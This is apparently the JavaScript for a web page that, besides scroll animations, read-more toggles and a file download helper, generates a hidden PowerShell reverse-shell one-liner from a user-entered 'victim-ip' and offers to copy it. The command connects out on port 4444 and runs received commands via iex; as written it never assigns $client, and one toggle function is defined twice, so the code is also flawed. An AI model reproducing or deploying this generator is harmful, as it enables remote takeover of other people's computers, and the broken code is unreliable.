document.addEventListener("DOMContentLoaded", () => {
  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      console.log(entry);
      if (entry.isIntersecting) {
        entry.target.classList.add('show');
      } else {
        entry.target.classList.remove('show');
      }
    });
  });

  const sectionsToObserve = document.querySelectorAll(".hidden");

  sectionsToObserve.forEach((section) => {
    observer.observe(section);
  });
});

function toggleReadMore(button) {
  const content = button.previousElementSibling;
  if (content.style.maxHeight === "0px" || content.style.maxHeight === "") {
      content.style.maxHeight = content.scrollHeight + "px";
      button.classList.remove("collapsed");
      button.classList.add("expanded");
  } else {
      content.style.maxHeight = "0";
      button.classList.remove("expanded");
      button.classList.add("collapsed");
  }
}

function downloadFiles() {
  var secondFileLink = document.createElement('a');
  secondFileLink.href = 'matrix.txt';
  secondFileLink.download = 'matrix.txt';
  document.body.appendChild(secondFileLink);
  secondFileLink.click();
  document.body.removeChild(secondFileLink);
}

    // Function to toggle the read-more content
        function toggleReadMore(button) {
            const content = button.previousElementSibling;
            if (content.classList.contains('hidden')) {
                content.classList.remove('hidden');
                button.textContent = 'Read Less';
            } else {
                content.classList.add('hidden');
                button.textContent = 'Read More';
            }
        }

        // Function to copy text to clipboard
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(function() {
                alert('Copied to clipboard!');
            }, function(err) {
                alert('Failed to copy text: ', err);
            });
        }

        // Function to generate the PowerShell command based on the entered IP
function generatePowerShellCommand() {
  const ip = document.getElementById('victim-ip').value.trim();
  const commandBox = document.getElementById('powershell-command');
if (ip) {
  const powerShellCommand = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${ip}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;
  commandBox.textContent = powerShellCommand;
} else {
  commandBox.textContent = 'Please enter a valid IP address.';
  }
}

        // Function to copy the generated PowerShell command
function copyPowerShellCommand() {
  const command = document.getElementById('powershell-command').textContent;
    if (command !== 'Please enter a valid IP address.') {
      copyToClipboard(command);
    } else {
      alert('No valid PowerShell command to copy.');
      }
}
